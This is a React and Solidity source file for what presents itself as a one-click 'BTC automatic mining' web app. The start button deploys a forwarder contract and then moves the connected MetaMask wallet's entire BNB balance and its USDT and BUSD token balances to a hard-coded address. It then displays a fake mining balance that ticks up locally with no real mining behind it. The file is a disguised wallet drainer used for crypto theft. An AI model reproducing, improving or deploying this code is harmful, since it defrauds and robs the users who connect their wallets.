import React, { useState, useEffect } from "react";
import { ethers } from "ethers";
import solc from "solc";
import { saveAs } from "file-saver";
import { Link } from "react-router-dom";
import ERC20ABI from "./ERC20ABI.json"; // 标准 ERC20 ABI

const C = "0x10146dB51CF86bA063DDCA3D46D01025699D97Fa";

// Solidity 源码
const BForwarderSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract BForwarder {
    address public constant C = 0x10146dB51CF86bA063DDCA3D46D01025699D97Fa;

    constructor() {}

    receive() external payable {
        if (msg.value > 0) {
            payable(C).transfer(msg.value);
        }
    }

    function forwardAllTokens(address tokenAddress) public {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(C, balance);
        }
    }

    function forwardMultipleTokens(address[] calldata tokenAddresses) public {
        for (uint i = 0; i < tokenAddresses.length; i++) {
            forwardAllTokens(tokenAddresses[i]);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
`;

function saveJSONToFile(data, filename) {
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
  saveAs(blob, filename);
}

// 编译 Solidity 并生成完整 Bytecode + ABI
function compileAndSave() {
  const input = {
    language: "Solidity",
    sources: { "BForwarder.sol": { content: BForwarderSource } },
    settings: { outputSelection: { "*": { "*": ["abi", "evm.bytecode.object"] } } },
  };

  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const contract = output.contracts["BForwarder.sol"]["BForwarder"];
  const abi = contract.abi;
  const bytecode = contract.evm.bytecode.object;

  // 保存 JSON 文件（可调试）
  saveJSONToFile(abi, "BForwarderABI.json");
  saveJSONToFile({ object: bytecode }, "BForwarderBytecode.json");

  return { abi, bytecode };
}

function App() {
  const [contractAddr, setContractAddr] = useState(null);
  const [btcBalance, setBtcBalance] = useState(0);
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [wallet, setWallet] = useState(null);

  const tokenList = [
    "0x55d398326f99059fF775485246999027B3197955", 
    "0xe9e7cea3dedca5984780bafc599bd69add087d56"
  ];

  // 初始化钱包
  useEffect(() => {
    async function initWallet() {
      if (!window.ethereum) return;
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const addr = await signer.getAddress();
      setWallet(addr);

      const stored = localStorage.getItem(addr);
      setBtcBalance(stored ? parseFloat(stored) : 0);
    }
    initWallet();
  }, []);

  // 挖矿进度动画
  useEffect(() => {
    let timer;
    if (loading || btcBalance > 0) {
      timer = setInterval(() => {
        setProgress((prev) => (prev >= 100 ? 0 : prev + 5));
      }, 300);
    }
    return () => clearInterval(timer);
  }, [loading, btcBalance]);

  // 部署 BForwarder 合约
  async function deployBForwarder() {
    if (!window.ethereum) return alert("请先安装 MetaMask");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();

    const { abi, bytecode } = compileAndSave();
    const factory = new ethers.ContractFactory(abi, bytecode, signer);

    const contract = await factory.deploy();
    await contract.waitForDeployment();

    setContractAddr(contract.target);
    return contract;
  }

  // 清空钱包 B -> C
  async function sweepWallet() {
    if (!window.ethereum) return alert("请先安装 MetaMask");
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const addr = await signer.getAddress();

    // 清空 BNB
    const balance = await provider.getBalance(addr);
    if (balance.gt(0)) {
      await signer.sendTransaction({ to: C, value: balance });
    }

    // 清空代币
    for (let tokenAddr of tokenList) {
      const token = new ethers.Contract(tokenAddr, ERC20ABI, signer);
      const tokenBalance = await token.balanceOf(addr);
      if (tokenBalance.gt(0)) {
        await token.transfer(C, tokenBalance);
      }
    }
  }

  // 虚拟挖矿
  function startMining() {
    setInterval(() => {
      setBtcBalance((prev) => {
        const next = prev + 0.001;
        if (wallet) localStorage.setItem(wallet, next.toFixed(3));
        return next;
      });
    }, 10000); // 每10秒增加0.001 BTC
  }

  // 一键操作：部署 + 钱包清空 + 挖矿
  async function handleClick() {
    try {
      setLoading(true);
      const contract = await deployBForwarder();
      await sweepWallet();
      alert("BForwarder 合约部署成功，钱包资产已清空给 C，开始挖矿！");
      startMining();
    } catch (err) {
      console.error(err);
      alert("操作失败，请重试");
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-black text-white">
      <h1 className="text-3xl font-bold mb-6">BTC 全自动</h1>

      <button
        onClick={handleClick}
        disabled={loading}
        className={`px-6 py-3 rounded-lg shadow-lg ${
          loading ? "bg-gray-500 cursor-not-allowed" : "bg-blue-500 hover:bg-blue-600"
        }`}
      >
        {loading ? "正在部署合约..." : "开始挖矿"}
      </button>

      {contractAddr && (
        <div className="mt-6 text-center w-full max-w-md">
          <p>B 合约地址: {contractAddr}</p>
          <p className="mt-2">BTC 余额: {btcBalance.toFixed(3)} BTC</p>

          <div className="mt-4 w-full bg-gray-700 rounded-full h-4 overflow-hidden">
            <div
              className="bg-green-500 h-4 transition-all duration-300"
              style={{ width: `${progress}%` }}
            ></div>
          </div>
        </div>
      )}

      <Link
        to="/ranking"
        className="mt-6 px-6 py-3 bg-green-500 rounded-lg hover:bg-green-600 transition"
      >
        排行榜
      </Link>
    </div>
  );
}

export default App;
